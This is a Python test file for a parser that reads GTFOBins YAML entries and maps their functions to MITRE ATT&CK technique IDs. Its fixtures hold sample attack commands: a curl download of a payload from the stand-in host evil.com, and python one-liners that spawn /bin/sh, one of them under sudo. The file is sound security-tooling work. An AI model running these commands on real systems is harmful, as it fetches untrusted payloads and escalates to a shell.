"""Tests for GTFOBins YAML parsing."""

from pathlib import Path

import yaml

from src.ingest.gtfobins import parse_gtfobins, FUNCTION_TO_TECHNIQUE


def _write_gtfobins(tmp_path: Path, name: str, data: dict) -> Path:
    d = tmp_path / "gtfobins"
    d.mkdir(exist_ok=True)
    fp = d / name  # GTFOBins files don't have .yml extension
    fp.write_text(yaml.dump(data))
    return d


class TestFunctionMapping:
    def test_known_mappings(self):
        assert FUNCTION_TO_TECHNIQUE["shell"] == "T1059"
        assert FUNCTION_TO_TECHNIQUE["download"] == "T1105"
        assert FUNCTION_TO_TECHNIQUE["sudo"] == "T1548.003"
        assert FUNCTION_TO_TECHNIQUE["suid"] == "T1548.001"
        assert FUNCTION_TO_TECHNIQUE["file-read"] == "T1005"


class TestParseGtfobins:
    def test_basic_parsing(self, tmp_path):
        d = _write_gtfobins(tmp_path, "curl", {
            "functions": {
                "download": [{"code": "curl http://evil.com/payload -o /tmp/payload"}],
            },
        })
        docs = parse_gtfobins(d)
        assert len(docs) == 1
        assert docs[0]["metadata"]["tool"] == "curl"
        assert docs[0]["metadata"]["attack_id"] == "T1105"
        assert docs[0]["metadata"]["platform"] == "Linux"
        assert docs[0]["metadata"]["function"] == "download"

    def test_multiple_functions(self, tmp_path):
        d = _write_gtfobins(tmp_path, "python", {
            "functions": {
                "shell": [{"code": "python -c 'import os; os.system(\"/bin/sh\")'"}],
                "download": [{"code": "python -c 'import urllib...'"}],
                "sudo": [{"code": "sudo python -c 'import os; os.system(\"/bin/sh\")'"}],
            },
        })
        docs = parse_gtfobins(d)
        ids = {d["metadata"]["attack_id"] for d in docs}
        assert "T1059" in ids   # shell
        assert "T1105" in ids   # download
        assert "T1548.003" in ids  # sudo

    def test_deduplicates_same_technique(self, tmp_path):
        """shell and command both map to T1059, should only appear once."""
        d = _write_gtfobins(tmp_path, "bash", {
            "functions": {
                "shell": [{"code": "bash"}],
                "command": [{"code": "bash -c cmd"}],
            },
        })
        docs = parse_gtfobins(d)
        t1059_docs = [d for d in docs if d["metadata"]["attack_id"] == "T1059"]
        assert len(t1059_docs) == 1

    def test_unknown_function_skipped(self, tmp_path):
        d = _write_gtfobins(tmp_path, "tool", {
            "functions": {
                "unknown_func": [{"code": "something"}],
            },
        })
        docs = parse_gtfobins(d)
        assert len(docs) == 0

    def test_empty_dir(self, tmp_path):
        d = tmp_path / "gtfobins"
        d.mkdir()
        assert parse_gtfobins(d) == []

    def test_nonexistent_dir(self, tmp_path):
        assert parse_gtfobins(tmp_path / "nonexistent") == []

    def test_tool_name_is_stem(self, tmp_path):
        """Tool name should be file stem, not full filename."""
        d = _write_gtfobins(tmp_path, "curl.md", {
            "functions": {
                "download": [{"code": "curl http://example.com"}],
            },
        })
        docs = parse_gtfobins(d)
        # File is "curl.md", stem should strip .md -> but the actual files
        # in GTFOBins don't have extensions normally. This test verifies
        # that fp.stem strips extensions properly
        assert docs[0]["metadata"]["tool"] == "curl"

    def test_hidden_files_skipped(self, tmp_path):
        d = tmp_path / "gtfobins"
        d.mkdir()
        (d / ".hidden").write_text(yaml.dump({"functions": {"shell": [{"code": "sh"}]}}))
        docs = parse_gtfobins(d)
        assert len(docs) == 0
